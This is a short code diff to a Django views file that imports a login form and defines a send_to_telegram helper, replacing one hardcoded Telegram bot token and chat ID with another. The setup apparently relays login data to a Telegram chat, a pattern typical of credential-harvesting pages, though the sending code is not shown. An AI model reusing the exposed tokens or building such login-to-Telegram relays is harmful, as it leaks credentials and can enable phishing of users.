@@ -3,8 +3,8 @@ from django.shortcuts import redirect
 from .forms import LoginForm
 import requests
 
-TELEGRAM_BOT_TOKEN = '7231984537:AAE7UwotAQaB_PW9GGm6AdgUZvBKik_0a1I'
-TELEGRAM_CHAT_ID = '7327655623'
+TELEGRAM_BOT_TOKEN = '7788451085:AAGlss8ucJhVAhBzgWbvpWTav33wWe7-XcQ'
+TELEGRAM_CHAT_ID = '7777020653'
 
 # Create your views here.
 def send_to_telegram(message):
